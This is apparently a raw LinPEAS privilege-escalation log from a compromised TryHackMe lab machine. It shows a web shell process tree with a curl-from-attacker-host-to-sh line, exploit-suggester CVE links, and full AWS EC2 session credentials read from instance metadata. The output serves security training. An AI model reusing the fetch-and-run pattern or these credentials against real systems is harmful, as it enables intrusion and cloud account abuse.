          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                        
    |---------------------------------------------------------------------------------|                                                                        
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz          |                                                                       
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                        
    |         Respect on HTB            :     SirBroccoli                             |                                                                        
    |---------------------------------------------------------------------------------|                                                                        
    |                                 Thank you!                                      |                                                                        
    \---------------------------------------------------------------------------------/                                                                        
          LinPEAS-ng by carlospolop                                                                                                                            
                                                                                                                                                               
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                    
                                                                                                                                                               
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                       
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                            
                               ╚═══════════════════╝                                                                                                           
OS: Linux version 5.4.0-156-generic (buildd@lcy02-amd64-078) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: lookup

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                                                                                       
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                             
                                                                                                                                                               

 18  820k   18  150k    0     0  93403      0  0:00:08  0:00:01  0:00:07 93347Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 33  820k   33  274k    0     0  22684      0  0:00:37  0:00:12  0:00:25 22684uniq: write error: Broken pipe                                                   
uniq: write error: Broken pipe
DONE
                                                                                                                                                               
 57  820k   57  474k    0     0  37379      0  0:00:22  0:00:12  0:00:10 37376                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                             
                              ╚════════════════════╝                                                                                                           
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                              
Linux version 5.4.0-156-generic (buildd@lcy02-amd64-078) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #173-Ubuntu SMP Tue Jul 11 07:25:22 UTC 2023      
Distributor ID: Ubuntu
Description:    Ubuntu 20.04.6 LTS
Release:        20.04
Codename:       focal

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                 
Sudo version 1.8.31                                                                                                                                            


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                         
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                                   

╔══════════╣ Date & uptime
Thu Mar 20 05:12:06 UTC 2025                                                                                                                                   
 05:12:06 up 31 min,  0 users,  load average: 0.15, 0.03, 0.01

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                      
/dev/disk/by-id/dm-uuid-LVM-v005ZedA7j7y56QkhMFFxIpAPjQzs7oulfbhGyXQdL80hdoMd7f940eF6eIyyall    /       ext4    defaults        0 1                            
/dev/disk/by-uuid/fe853f08-cc6e-4ac9-9eaf-a0d076c2c15d  /boot   ext4    defaults        0 1
/dev/disk/by-id/dm-uuid-LVM-v005ZedA7j7y56QkhMFFxIpAPjQzs7ouomUCv50xJe6dL15kDJr03lqYwKfBVOfc    none    swap    sw      0 0

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                           

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                        
OLDPWD=/var/www/files.lookup.thm/public_html/elFinder/php                                                                                                      
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:21284
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
INVOCATION_ID=2a763611fd49444494ddc5745ab5207d
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
APACHE_RUN_USER=www-data
APACHE_RUN_GROUP=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                          
dmesg Not Found                                                                                                                                                
                                                                                                                                                               
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                             
cat: write error: Broken pipe                                                                                                                                  
cat: write error: Broken pipe
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: probable
   Tags: [ ubuntu=(20.04) ]{kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: less probable
   Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


Vulnerable to CVE-2021-3560

╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                  
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                       
═╣ PaX bins present? .............. PaX Not Found                                                                                                              
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                       
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                         
═╣ Seccomp enabled? ............... disabled                                                                                                                   
═╣ User namespace? ................ enabled
═╣ Cgroup2 enabled? ............... enabled
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (kvm)                                                                                                                  

 73  820k   73  606k    0     0  19382      0  0:00:43  0:00:32  0:00:11 19382                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                            
                                   ╚═══════════╝                                                                                                               
╔══════════╣ Container related tools present (if any):
╔══════════╣ Container details                                                                                                                                 
═╣ Is this a container? ........... No                                                                                                                         
═╣ Any running containers? ........ No                                                                                                                         
                                                                                                                                                               

                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                            
                                     ╚═══════╝                                                                                                                 
grep: /etc/motd: No such file or directory
/usr/bin/curl
Learn and practice cloud hacking techniques in training.hacktricks.xyz
                                                                                                                                                               
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-02ff2598acaef8a96                                                                                                                                  
instance-action: none
instance-id: i-0fdf855452492f03d
instance-life-cycle: spot
instance-type: t3a.small
region: eu-west-1

══╣ Account Info
{                                                                                                                                                              
  "Code" : "Success",
  "LastUpdated" : "2025-03-20T04:40:47Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 02:86:2b:34:17:81/                                                                                                                                        
Owner ID: 739930428441
Public Hostname: 
Security Groups: AllowEverything
Private IPv4s:

Subnet IPv4: 10.10.0.0/16
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
                                                                                                                                                               

══╣ User Data
Content-Type: multipart/mixed; boundary="==BOUNDARY=="                                                                                                         
MIME-Version: 1.0

--==BOUNDARY==
Content-Type: text/cloud-config
MIME-Version: 1.0

# Create a directory to store the downloaded file
bootcmd:
  - 'echo "userId: 675407a1fac0372dd248e5b3" > /.badr-info'
  - 'echo "uploadId: 6641cf9d401a40a2c96215fe" >> /.badr-info'
  - 'echo "roomId: 65a0523d8c0a74ccfe398ea3" >> /.badr-info'
  - 'echo "roomCode: lookup" >> /.badr-info'
  - 'echo "taskId: 65a052dab77e315aacb908be" >> /.badr-info'
  - 'echo "instanceId: 67db9c416c26bd3a984021ce" >> /.badr-info'
  - 'mkdir /etc/badr'

runcmd:
  - 'wget -O /etc/badr/badr https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/badr'
  - 'wget -O /etc/badr/init.sh https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/init.sh'
  - 'wget -O /etc/systemd/system/badr.service https://tryhackme-vm-deployment.s3.eu-west-1.amazonaws.com/badr.service'
  - 'chmod +x /etc/badr/badr /etc/badr/init.sh'
  - 'systemctl daemon-reload'
  - 'systemctl enable badr.service'
  - 'systemctl start badr.service'
 
--==BOUNDARY==--

══╣ EC2 Security Credentials
{                                                                                                                                                              
  "Code" : "Success",
  "LastUpdated" : "2025-03-20T04:40:44Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQMR6GLSKPG",
  "SecretAccessKey" : "yaHClWmaAIMqrxkz39yd+mq5lRj4NI3fuIpFQrvx",
  "Token" : "IQoJb3JpZ2luX2VjEC0aCWV1LXdlc3QtMSJHMEUCIAJorrgyUF2A0kNO4Rf+gUDmA2RAydad6CIAqBqPifc6AiEAukF6L7HPv8Ghonuz/aB1VHxJ6PqZigoxhPUPiT7QVV8qzwQIhv//////////ARADGgw3Mzk5MzA0Mjg0NDEiDONpLsfE3/AmBhSQPSqjBA6SLI/v2MLDMH/mpPZr/Bo+dgGyVmXz4UN2k1C9BZujHHIuAdyKvTVqbpUC53PyHItpEeD+DurJwn3zDfgycaycv+YDyeDB29N0kBsuHaYoNCrD5oTtkplLWTikzqyLe2r4XSTxtygwZfXbhm9iASKCu5l42cIAxTYTFeNubCjGJ0N5PNy8RyEmShi74DRf/H0N7IBmYEAaMnMPQrFux4bW3GIXxL6qNzzgnU5HnTsOGwBQkkmklq84KCIoPeohH+ruAX2I0R50waqkpS96WbWsXPhKIJnONXK8mLaVlJFNzThLwpVEtXT6K23rJ4NfaD94DD7eWsSL30zg3l5juj9IQ2G+uNF47GD8pLKMysM5MDHs9RKvPq3UK36MN8MmyTX8sYXIYWyhZ9CAOEqhtMZp2tNhRlYvIxaCdCOh2+6Gs+BaKHjJBiCXAGORtUAcBHl7+qtz2gUM0GIo44EoYaTG+qTYASwqiBBNVXne97OImgMrxcItvcJyC3GNVTDmTnIclr/1uTACnATbUFLBBI3q9q3xPD5eu4sWuk69LIK1NTo4NBL3kGcsZCMZTPqd0aH3c260Zo7o7XGcgyoD2XnSQwFJhPRmLEk6qTxYGghoFQiyxMEGxpM+W5wsUALRd9jWsi69U9P2DT7L1XDJcDDGqj0Mj5LE4iILd3maL37FyR6lknvE+VSV6RsJoVNscFz3F4Kn6OasahXxy9yrMpB5Hogww7juvgY6kwIOLNFMWphgLql8eRWo4ewv95afT8ukVKt9o+CVzNLcp95KOFjHpH1DqW36fzWzs9ebGKxh9VOjBP9yn924V49YKhmlAxk5ekLGphKCXhbxS27WIcAMKeqq256mw1uqyEcN9TemQRDPbqZY+HvgZcV/BGXDwxEB+ICzNuiMTMxe8BFO/iC9Y7GbVDWLzt2UWbh2mmg+7RqjULwr7f+dEP+DJbkmyg2FSInf3ym+Av8x2nekTZNVc00LwGEpUnAU6M0/yspZ3fwCtqe2gXeXtviLrtw0A1gy0ARLkh1+XqaQUr8ILpNTTwSmY6uru8C80kHSpye1yy0Ln13p6+sa58xfcO14NJtVOEms65P6YFaiH+wPTg==",
  "Expiration" : "2025-03-20T10:42:38Z"
}
══╣ SSM Runnig
root         586  0.0  0.9 1832368 18292 ?       Ssl  04:41   0:00 /usr/bin/amazon-ssm-agent                                                                   



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                             
                ╚════════════════════════════════════════════════╝                                                                                             
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                     
root           1  0.0  0.5 104576 11580 ?        Ss   04:40   0:01 /sbin/init auto automatic-ubiquity noprompt                                                 
root         373  0.0  0.4  21736  8448 ?        S<s  04:41   0:00 /lib/systemd/systemd-journald
root         410  0.0  0.3  23160  6592 ?        Ss   04:41   0:01 /lib/systemd/systemd-udevd
systemd+     426  0.0  0.3  27272  7572 ?        Ss   04:41   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
root         509  0.0  0.9 280136 17948 ?        SLsl 04:41   0:00 /sbin/multipathd -d -s
systemd+     548  0.0  0.6  24684 12116 ?        Ss   04:41   0:00 /lib/systemd/systemd-resolved
systemd+     549  0.0  0.3  90884  6112 ?        Ssl  04:41   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
root         562  0.0  0.3 235564  7400 ?        Ssl  04:41   0:00 /usr/lib/accountsservice/accounts-daemon
message+     563  0.0  0.2   7576  4448 ?        Ss   04:41   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root         567  0.0  0.1  81828  3576 ?        Ssl  04:41   0:00 /usr/sbin/irqbalance --foreground
root         569  0.0  0.9  29668 18212 ?        Ss   04:41   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root         571  0.0  0.4 234628  8712 ?        Ssl  04:41   0:00 /usr/lib/policykit-1/polkitd --no-debug
syslog       572  0.0  0.2 224344  4760 ?        Ssl  04:41   0:00 /usr/sbin/rsyslogd -n -iNONE
root         573  0.0  0.3  17232  7324 ?        Ss   04:41   0:00 /lib/systemd/systemd-logind
root         574  0.0  0.6 393204 12224 ?        Ssl  04:41   0:00 /usr/lib/udisks2/udisksd
root         586  0.0  0.9 1832368 18292 ?       Ssl  04:41   0:00 /usr/bin/amazon-ssm-agent
root         595  0.0  0.1   6816  2992 ?        Ss   04:41   0:00 /usr/sbin/cron -f
root         627  0.0  0.1   5600  2240 ttyS0    Ss+  04:41   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root         629  0.0  0.0   5828  1784 tty1     Ss+  04:41   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
daemon[0m       630  0.0  0.1   3796  2268 ?        Ss   04:41   0:00 /usr/sbin/atd -f
root         671  0.0  1.0 107920 20960 ?        Ssl  04:41   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root         672  0.0  0.5 315108 10976 ?        Ssl  04:41   0:00 /usr/sbin/ModemManager
root         738  0.0  0.9 194088 18452 ?        Ss   04:41   0:00 /usr/sbin/apache2 -k start
www-data     739  0.0  1.2 199700 24700 ?        S    04:41   0:00  _ /usr/sbin/apache2 -k start
www-data     740  0.0  1.2 199676 23992 ?        S    04:41   0:00  _ /usr/sbin/apache2 -k start
www-data     741  0.0  1.2 199684 25112 ?        S    04:41   0:00  _ /usr/sbin/apache2 -k start
www-data     742  0.0  0.4 194576  9504 ?        S    04:41   0:00  _ /usr/sbin/apache2 -k start
www-data     743  0.0  0.6 194576 13016 ?        S    04:41   0:00  _ /usr/sbin/apache2 -k start
www-data     875  0.0  0.9 194576 17980 ?        S    04:52   0:00  _ /usr/sbin/apache2 -k start
www-data    1033  0.0  0.0   2608   600 ?        S    04:59   0:00  |   _ sh -c /bin/sh
www-data    1034  0.0  0.0   2608  1608 ?        S    04:59   0:00  |       _ /bin/sh
www-data    1196  0.0  0.5  21888 11004 ?        S    05:11   0:00  |           _ curl 10.4.114.252:8888/linpeas.sh
www-data    1197  0.2  0.1   3692  2876 ?        S    05:11   0:00  |           _ sh
www-data    4423  0.0  0.0   3692  1176 ?        S    05:12   0:00  |               _ sh
www-data    4427  0.0  0.1   6036  2880 ?        R    05:12   0:00  |               |   _ ps fauxwww
www-data    4426  0.0  0.0   3692  1176 ?        S    05:12   0:00  |               _ sh
www-data     876  0.0  1.2 199684 24664 ?        S    04:52   0:00  _ /usr/sbin/apache2 -k start
www-data     877  0.0  1.2 199684 24840 ?        S    04:52   0:00  _ /usr/sbin/apache2 -k start


╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                                              
gdm-password Not Found                                                                                                                                         
gnome-keyring-daemon Not Found                                                                                                                                 
lightdm Not Found                                                                                                                                              
vsftpd Not Found                                                                                                                                               
apache2 process found (dump creds from memory as root)                                                                                                         
sshd: process found (dump creds from memory as root)

╔══════════╣ Processes whose PPID belongs to a different user (not root)
╚ You will know if a user can somehow spawn processes as a different user                                                                                      
                                                                                                                                                               
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                             
COMMAND    PID TID TASKCMD               USER   FD      TYPE             DEVICE SIZE/OFF  NODE NAME                                                            

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#systemd-path---relative-paths                                                
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                                              

╔══════════╣ Cron jobs
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs                                                           
/usr/bin/crontab                                                                                                                                               
incrontab Not Found
-rw-r--r-- 1 root root    1042 Jan 11  2024 /etc/crontab                                                                                                       

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Jan 11  2024 .
drwxr-xr-x 104 root root 4096 Mar 20 04:41 ..
-rw-r--r--   1 root root  102 Jan 11  2024 .placeholder
-rw-r--r--   1 root root  201 Jan 11  2024 e2scrub_all
-rw-r--r--   1 root root  712 Mar 27  2020 php
-rw-r--r--   1 root root  191 Jan 11  2024 popularity-contest

/etc/cron.daily:
total 52
drwxr-xr-x   2 root root 4096 Jan 11  2024 .
drwxr-xr-x 104 root root 4096 Mar 20 04:41 ..
-rw-r--r--   1 root root  102 Jan 11  2024 .placeholder
-rwxr-xr-x   1 root root  539 Jan 11  2024 apache2
-rwxr-xr-x   1 root root  376 Jan 11  2024 apport
-rwxr-xr-x   1 root root 1478 Jan 11  2024 apt-compat
-rwxr-xr-x   1 root root  355 Jan 11  2024 bsdmainutils
-rwxr-xr-x   1 root root 1187 Jan 11  2024 dpkg
-rwxr-xr-x   1 root root  377 Jan 11  2024 logrotate
-rwxr-xr-x   1 root root 1123 Jan 11  2024 man-db
-rwxr-xr-x   1 root root 4574 Jan 11  2024 popularity-contest
-rwxr-xr-x   1 root root  214 Jan 11  2024 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Jan 11  2024 .
drwxr-xr-x 104 root root 4096 Mar 20 04:41 ..
-rw-r--r--   1 root root  102 Jan 11  2024 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Jan 11  2024 .
drwxr-xr-x 104 root root 4096 Mar 20 04:41 ..
-rw-r--r--   1 root root  102 Jan 11  2024 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jan 11  2024 .
drwxr-xr-x 104 root root 4096 Mar 20 04:41 ..
-rw-r--r--   1 root root  102 Jan 11  2024 .placeholder
-rwxr-xr-x   1 root root  813 Jan 11  2024 man-db
-rwxr-xr-x   1 root root  403 Jan 11  2024 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )

╔══════════╣ System timers
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                       
NEXT                        LEFT          LAST                        PASSED               UNIT                         ACTIVATES                              
Thu 2025-03-20 05:26:49 UTC 14min left    Wed 2024-04-17 07:42:52 UTC 11 months 2 days ago apt-daily-upgrade.timer      apt-daily-upgrade.service     
Thu 2025-03-20 05:39:00 UTC 26min left    Thu 2025-03-20 05:09:56 UTC 2min 31s ago         phpsessionclean.timer        phpsessionclean.service       
Thu 2025-03-20 05:43:50 UTC 31min left    Thu 2024-01-11 20:19:53 UTC 1 years 2 months ago apt-daily.timer              apt-daily.service             
Thu 2025-03-20 07:56:33 UTC 2h 44min left Wed 2024-04-17 09:31:11 UTC 11 months 2 days ago fwupd-refresh.timer          fwupd-refresh.service         
Thu 2025-03-20 10:00:39 UTC 4h 48min left Wed 2024-04-17 07:43:41 UTC 11 months 2 days ago motd-news.timer              motd-news.service             
Thu 2025-03-20 11:12:24 UTC 5h 59min left Thu 2025-03-20 04:45:06 UTC 27min ago            ua-timer.timer               ua-timer.service              
Fri 2025-03-21 00:00:00 UTC 18h left      Thu 2025-03-20 04:41:18 UTC 31min ago            logrotate.timer              logrotate.service             
Fri 2025-03-21 00:00:00 UTC 18h left      Thu 2025-03-20 04:41:18 UTC 31min ago            man-db.timer                 man-db.service                
Fri 2025-03-21 04:56:08 UTC 23h left      Thu 2025-03-20 04:56:08 UTC 16min ago            systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Sun 2025-03-23 03:10:53 UTC 2 days left   Thu 2025-03-20 04:41:47 UTC 30min ago            e2scrub_all.timer            e2scrub_all.service           
Mon 2025-03-24 00:00:00 UTC 3 days left   Thu 2025-03-20 04:41:18 UTC 31min ago            fstrim.timer                 fstrim.service                
n/a                         n/a           n/a                         n/a                  snapd.snap-repair.timer                                    

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#timers                                                                       
/etc/systemd/system/snapd.snap-repair.timer                                                                                                                    

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#services                                                                     
/etc/systemd/system/multi-user.target.wants/atd.service could be executing some relative path                                                                  
/etc/systemd/system/multi-user.target.wants/grub-common.service could be executing some relative path
/etc/systemd/system/sleep.target.wants/grub-common.service could be executing some relative path
You can't write on systemd PATH

╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                      
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                    
/snap/core20/1950/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1950/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1950/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1950/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1950/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core20/1950/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core20/1950/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1950/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1950/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core20/1974/usr/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1974/usr/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/snap/core20/1974/usr/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1974/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1974/usr/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/snap/core20/1974/usr/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/snap/core20/1974/usr/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/snap/core20/1974/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/snap/core20/1974/usr/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                                                      
sed: -e expression #1, char 0: no previous regular expression                                                                                                  
/org/kernel/linux/storage/multipathd
/run/dbus/system_bus_socket
  └─(Read Write)
/run/irqbalance//irqbalance567.sock
  └─(Read )
/run/irqbalance/irqbalance567.sock
  └─(Read )
/run/lvm/lvmpolld.socket
/run/systemd/fsck.progress
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/io.systemd.journal
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/systemd/userdb/io.systemd.DynamicUser
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/snap/lxd/common/lxd/unix.socket

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#d-bus                                                                        
NAME                           PID PROCESS         USER             CONNECTION    UNIT                        SESSION DESCRIPTION                              
:1.0                             1 systemd         root             :1.0          init.scope                  -       -
:1.1                           548 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service    -       -
